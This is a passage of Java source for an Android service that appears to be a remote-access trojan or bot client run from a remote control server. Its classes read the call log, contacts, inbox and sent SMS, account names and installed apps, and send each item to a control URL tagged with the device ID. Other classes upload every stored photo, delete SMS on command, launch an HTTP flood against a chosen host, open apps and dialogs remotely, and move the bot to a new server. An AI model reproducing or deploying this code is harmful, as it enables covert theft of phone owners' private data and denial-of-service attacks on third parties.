	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Browser Bookmarks");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getCallHistory extends AsyncTask<String, Void, String> {
		String j = "";
        public getCallHistory(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
			String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
	        Uri callUri = Uri.parse("content://call_log/calls");
	        Cursor managedCursor = getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
	        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
	        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
	        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
	        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
	        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
	        int i = 0;
	        while (managedCursor.moveToNext()) {
	        	if(i<Integer.parseInt(j))
		        {
		            String phNumber = managedCursor.getString(number);
		            String nameS = managedCursor.getString(name);
		            String callType = managedCursor.getString(type);
		            String callDate = managedCursor.getString(date);
		            Date callDayTime = new Date(Long.valueOf(callDate));
		            String callDuration = managedCursor.getString(duration);
		            String dir = null;
		            
		            int dircode = Integer.parseInt(callType);
		            switch (dircode) {
		            case CallLog.Calls.OUTGOING_TYPE:
		                dir = "OUTGOING";
		                break;
		
		            case CallLog.Calls.INCOMING_TYPE:
		                dir = "INCOMING";
		                break;
		
		            case CallLog.Calls.MISSED_TYPE:
		                dir = "MISSED";
		                break;
		            }
	    	        try {
						getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "["+dir+"] " + "["+phNumber+"] " + "[" + nameS + "] "+ "["+callDate+"] " + "["+callDayTime+"] " + "[Duration: "+callDuration+" seconds]");
					} catch (UnsupportedEncodingException e) {
						 
						e.printStackTrace();
					}        	
		        }
	        	i++;
	        }
	        managedCursor.close();
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call History Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Call History");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getContacts extends AsyncTask<String, Void, String> {
		String j = "";
        public getContacts(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
			ContentResolver cr = getContentResolver();
		    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
		    if (cur.getCount() > 0) {
		    	int i = 0;
			        while (cur.moveToNext()) {
				    	if(i<Integer.parseInt(j))
				    	{
			              String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
			              String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

			              if (Integer.parseInt(cur.getString(
			                    cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
			                 Cursor pCur = cr.query(
			                           ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
			                           null,
			                           ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
			                           new String[]{id}, null);
			                 while (pCur.moveToNext()) {
			                     String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							        try {
										getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + name.replace(' ', '*') + "] " + phoneNo.replace(' ', '*'));
									} catch (UnsupportedEncodingException e) {
										 
										e.printStackTrace();
									}        	
			                 }
			                pCur.close();
			            }
			        }
				    	i++;
		    	}
		    }
	        
		    return "Executed";
		}
	        @Override
	        protected void onPostExecute(String result) {
	        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
		        try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Contacts Complete");
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}        	
	        }
	        @Override
	        protected void onPreExecute() {
		        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
		        {
		        	 try {
		        	        Thread.sleep(5000);         
		        	    } catch (InterruptedException e) {
		        	       e.printStackTrace();
		        	    }
		        }
		        try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Contacts");
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}        	
	        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
	        }
	        @Override
	        protected void onProgressUpdate(Void... values) {
	        }
	}
    //********************************************************************************************************************************************************
	public class getInboxSms extends AsyncTask<String, Void, String> {
		String j = "";
        public getInboxSms(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	Uri callUri = Uri.parse("content://sms/inbox");
	        Cursor mCur = getApplicationContext().getContentResolver().query(callUri, null, null, null, null);        
	        if (mCur.moveToFirst()) 
	        	{
	        	int i = 0;
		            while (mCur.isAfterLast() == false) {
		            	if(i<Integer.parseInt(j))
		            	{
//			                Log.i("com.connect", "Address: " + mCur.getString(mCur.getColumnIndex("address")));
//			                Log.i("com.connect", "Message: " + mCur.getString(mCur.getColumnIndex("body")));
			                
			                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
			                Calendar calendar = Calendar.getInstance();
			                String now = mCur.getString(mCur.getColumnIndex("date"));
			                calendar.setTimeInMillis(Long.parseLong(now));
//			                Log.i("com.connect", "Date: " + formatter.format(calendar.getTime()));
//			                Log.i("com.connect", "**************************************************************");
			                
			                String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
			                String id = mCur.getString(mCur.getColumnIndex("_id"));

					        try {
								getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()).replace(' ', '*') + "] [" + thread_id + "] " + "[" + id + "] " + "[" + mCur.getString(mCur.getColumnIndex("address")).replace(' ', '*') + "] " + mCur.getString(mCur.getColumnIndex("body")).replace(' ', '*'));
							} catch (UnsupportedEncodingException e) {
								 
								e.printStackTrace();
							}        	

			            	}
			                i++;
			                mCur.moveToNext();
		            }
	        	}
	        mCur.close();
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Inbox SMS Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Inbox SMS");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getSentSms extends AsyncTask<String, Void, String> {
		String j = "";
        public getSentSms(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	        Uri callUri = Uri.parse("content://sms/sent");
	        Cursor mCur = getApplicationContext().getContentResolver().query(callUri, null, null, null, null);        
	        if (mCur.moveToFirst()) {
	        	int i = 0;
	            while (mCur.isAfterLast() == false) {
	            	if(i<Integer.parseInt(j))
	            	{
//	                Log.i("com.connect", "Address: " + mCur.getString(mCur.getColumnIndex("address")));
//	                Log.i("com.connect", "Message: " + mCur.getString(mCur.getColumnIndex("body")));

	                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
	                Calendar calendar = Calendar.getInstance();
	                String now = mCur.getString(mCur.getColumnIndex("date"));
	                calendar.setTimeInMillis(Long.parseLong(now));
//	                Log.i("com.connect", "Date: " + formatter.format(calendar.getTime()));
	                String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
	                String id = mCur.getString(mCur.getColumnIndex("_id"));
	                
//	                Log.i("com.connect", "thread_id " + thread_id);
//	                Log.i("com.connect", "id " + id);
	                
	                try {
						getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()).replace(' ', '*') + "] [" + thread_id + "] " + "[" + id + "] " + "[" + mCur.getString(mCur.getColumnIndex("address")).replace(' ', '*') + "] " + mCur.getString(mCur.getColumnIndex("body")).replace(' ', '*'));
					} catch (UnsupportedEncodingException e) {
						 
						e.printStackTrace();
					}        	

	            	}
	                i++;
	                mCur.moveToNext();
	            }
	        }
	        mCur.close();
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Sent SMS Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Sent SMS");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class deleteSms extends AsyncTask<String, Void, String> {
		String i = "";
		String j = "";
        public deleteSms(String i, String j) {
        	this.i = i;
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
			Uri thread = Uri.parse( "content://sms");
			ContentResolver contentResolver = getContentResolver();
//			Cursor cursor = contentResolver.query(thread, null, null, null,null);
			contentResolver.delete( thread, "thread_id=? and _id=?", new String[]{String.valueOf(i), String.valueOf(j)});
	        
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "SMS Delete [" + i + "] [" + j + "] Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}   
			
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {     	
        }
        @Override
        protected void onPreExecute() {      	
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getUserAccounts extends AsyncTask<String, Void, String> {
		String j = "";
        public getUserAccounts(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	AccountManager am = AccountManager.get(getApplicationContext());
	        Account[] accounts = am.getAccounts();
	        ArrayList<String> googleAccounts = new ArrayList<String>();
	        int i = 0;
	        for (Account ac : accounts) {
	        	if(i<Integer.parseInt(j))
	        	{
	            String acname = ac.name;
	            String actype = ac.type;
	            googleAccounts.add(ac.name);            
	            
		        try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + actype + "] " + acname );
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}        	
	        	}
	        	i++;
	        }
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "User Accounts Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting User Accounts");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getInstalledApps extends AsyncTask<String, Void, String> {
		String j = "";
        public getInstalledApps(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	final PackageManager packageManager = getApplicationContext().getPackageManager();
	    	List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
	    	int i = 0;
	    	for (ApplicationInfo appInfo : installedApplications)
	    	{
	        	if(i<Integer.parseInt(j))
	        	{
		    	    if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0)
		    	    {
		    	        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[SystemApp] " + appInfo.packageName);
						} catch (UnsupportedEncodingException e) {
							 
							e.printStackTrace();
						}        	
		    	    }
		    	    else
		    	    {
		    	        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[UserApp] " + appInfo.packageName);
						} catch (UnsupportedEncodingException e) {
							 
							e.printStackTrace();
						}      
		    	    }
	        	}
	        	i++;
	    	}
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Installed Apps Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Installed Apps");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************   
	public class httpFlood extends AsyncTask<String, Void, String> {
		String i = "";
		String j = "";
        public httpFlood(String i, String j) {
        	this.i = i;
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	        for (long stop=System.nanoTime()+TimeUnit.MILLISECONDS.toNanos(Integer.parseInt(j));stop>System.nanoTime();) {
	             try {
	              String target = i;
	              Socket net = new Socket(target, 80);
	              sendRawLine("GET / HTTP/1.1", net);
	              sendRawLine("Host: " + target, net);
	              sendRawLine("Connection: close", net);
	             }
	             catch(UnknownHostException e)
	             {}
	             catch(IOException e)
	             {}
	           }
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onPreExecute() {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    public static void sendRawLine(String text, Socket sock) {
        try {
        	   BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
        	   out.write(text+"\n");
        	   out.flush();
        	} 
        catch(IOException ex) 
        {
        	   ex.printStackTrace();
        }
    };
      //********************************************************************************************************************************************************   
	public class openApp extends AsyncTask<String, Void, String> {
		String i = "";
        public openApp(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	final PackageManager packageManager = getApplicationContext().getPackageManager();
	    	List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);	
	    	for (ApplicationInfo appInfo : installedApplications)
	    	{
	    		if(appInfo.packageName.equals(i))
	    		{
			    	Intent k = new Intent();
			    	PackageManager manager = getPackageManager();
			    	k = manager.getLaunchIntentForPackage(i);
			    	k.addCategory(Intent.CATEGORY_LAUNCHER);
			    	startActivity(k);
			    	
			        try {
						getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Opened App: " + i);
					} catch (UnsupportedEncodingException e) {
						 
						e.printStackTrace();
					}        	
	    		}
	    	}
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {/*httpcalldone*/}
        @Override
        protected void onPreExecute() {/*httpcallexecuting*/}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************   
	public class openDialog extends AsyncTask<String, Void, String> {
		String i = "";
		String j = "";
      public openDialog(String i, String j) {
      	this.i = i;
      	this.j = j;
      }
		@Override
      protected String doInBackground(String... params) {     
			
			  	  Intent intent = new Intent(getApplicationContext(), Dialog.class);
			  	  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			  	  intent.putExtra("Title", i);
			  	  intent.putExtra("Message", j);
			  	  startActivity(intent);
			  	  
			        try {
						getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Opened Dialog: " + i + " : " + j);
					} catch (UnsupportedEncodingException e) {
						 
						e.printStackTrace();
					}        	
			  	  
		    return "Executed";
      }      
      @Override
      protected void onPostExecute(String result) {/*httpcalldone*/}
      @Override
      protected void onPreExecute() {/*httpcallexecuting*/}
      @Override
      protected void onProgressUpdate(Void... values) {
      }
	}
    //********************************************************************************************************************************************************    //********************************************************************************************************************************************************   
	public class uploadPictures extends AsyncTask<String, Void, String> {
		String i = "";
		String j = "";
		String k = "";
      public uploadPictures(String i, String j, String k) {
      	this.i = i;
      	this.j = j;
      	this.k = k;
      }
		@Override
      protected String doInBackground(String... params) {     
			
			Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
		    String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.BUCKET_ID,
		            MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE};
		  	  Log.i("com.connect", "Pictures started");
    
		    Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
		    if (cursor != null) 
		    {
		        while (cursor.moveToNext()) 
		        {
//		            if(Integer.parseInt(i)<Integer.parseInt(cursor.getString(5)) && Integer.parseInt(j)>Integer.parseInt(cursor.getString(5)) && Integer.parseInt(k) > (Integer.parseInt(cursor.getString(7))/1024^2))
//		            {
			    		  new UploadFile(cursor.getString(3), urlUploadPictures + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//		            }
		        }
		    }
		        cursor.close();     	
			  	  Log.i("com.connect", "Pictures done");
		    return "Executed";
      }      
      @Override
      protected void onPostExecute(String result) {/*httpcalldone*/}
      @Override
      protected void onPreExecute() {/*httpcallexecuting*/}
      @Override
      protected void onProgressUpdate(Void... values) {
      }
	}
    //********************************************************************************************************************************************************
	private class UploadFile extends AsyncTask<String, Void, String> {
		String j = "";
		String i = "";
        public UploadFile(String j, String i) {
        	this.j = j;
        	this.i = i;
        }
        @Override
        protected String doInBackground(String... params) {
        	
		    File sd = new File(j);
		    if(sd.exists())
		    {
		        	HttpURLConnection connection = null;
		        	DataOutputStream outputStream = null;
		        	DataInputStream inputStream = null;
		
		        	String pathToOurFile = j;
		        	String urlServer = URL + i;
		        	
			    	Log.i("com.connect","pathToOurFile : " + pathToOurFile);
			    	Log.i("com.connect","urlServer : " + urlServer);

		        	
		        	String lineEnd = "\r\n";
		        	String twoHyphens = "--";
		        	String boundary =  "*****";
		        	int bytesRead, bytesAvailable, bufferSize;
		        	byte[] buffer;
		        	int maxBufferSize = 1*1024*1024*1000*10;
		        	
		        	try
		            {		
			            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );
			
			            URL url = new URL(urlServer);
			            connection = (HttpURLConnection) url.openConnection();
			
			            // Allow Inputs & Outputs
			            connection.setDoInput(true);
			            connection.setDoOutput(true);
			            connection.setUseCaches(false);
			
			            // Enable POST method
			            connection.setRequestMethod("POST");
			
			            connection.setRequestProperty("Connection", "Keep-Alive");
			            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);
			
			            outputStream = new DataOutputStream( connection.getOutputStream() );
			            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile +"\"" + lineEnd);
			            outputStream.writeBytes(lineEnd);
			
			            bytesAvailable = fileInputStream.available();
			            bufferSize = Math.min(bytesAvailable, maxBufferSize);
			            buffer = new byte[bufferSize];
			
			            // Read file
			            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
		
			            while (bytesRead > 0)
			            {
				            outputStream.write(buffer, 0, bufferSize);
				            bytesAvailable = fileInputStream.available();
				            bufferSize = Math.min(bytesAvailable, maxBufferSize);
				            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			            }
		
			            outputStream.writeBytes(lineEnd);
			            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
			
			            // Responses from the server (code and message)
			            int serverResponseCode = connection.getResponseCode();
			            String serverResponseMessage = connection.getResponseMessage();
			            fileInputStream.close();
			            outputStream.flush();
			            outputStream.close();
//				        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");       
		            }
		            catch (Exception ex)
		            {ex.printStackTrace();}
		    }
            return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //******************************************************************************************************************************************************** 
	public class transferBot extends AsyncTask<String, Void, String> {
		String i = "";
      public transferBot(String i) {
      	this.i = i;
      }
		@Override
      protected String doInBackground(String... params) {     
			String oldURL = URL;
			
		    PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", Base64.encodeToString(i.getBytes(), Base64.DEFAULT ));
		    URL = i;
		    
	        try {
				getInputStreamFromUrl(oldURL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Bot Transfered To: " + i);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}       
		    return "Executed";
      }      
      @Override
      protected void onPostExecute(String result) {/*httpcalldone*/}
      @Override
      protected void onPreExecute() {/*httpcallexecuting*/}
      @Override
      protected void onProgressUpdate(Void... values) {
      }
	}
    //******************************************************************************************************************************************************** 
//	public class isUrlAlive extends AsyncTask<String, Void, String> {
//		String i = "";
//
//      public isUrlAlive(String i) {
//      	this.i = i;
//      }
//		@Override
//      protected String doInBackground(String... params) {  
//			boolean alive = false;
//			
//			try {
//				  final URL url = new URL(i);
//				  final HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
//				  urlConn.setConnectTimeout(1000 * 10);
//				  urlConn.connect();
//				  if (urlConn.getResponseCode() == HttpURLConnection.HTTP_OK) {
//					  alive = true;
//				  }
//				 } catch (final MalformedURLException e1) {
//				  e1.printStackTrace();
//				 } catch (final IOException e) {
//				  e.printStackTrace();
//				 }
//   
//		    if(!alive)
//		    {
//				PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", ""), Base64.DEFAULT )));
//		    }
//		    
//		    return "Executed";
//      }      
//      @Override
//      protected void onPostExecute(String result) {/*httpcalldone*/}
//      @Override
//      protected void onPreExecute() {/*httpcallexecuting*/}
//      @Override
//      protected void onProgressUpdate(Void... values) {
//      }
//	}
    //******************************************************************************************************************************************************** 
	@Override
	public void onDestroy() 
	{
		unregisterReceiver(mReceiver);
		super.onDestroy();
	}
}
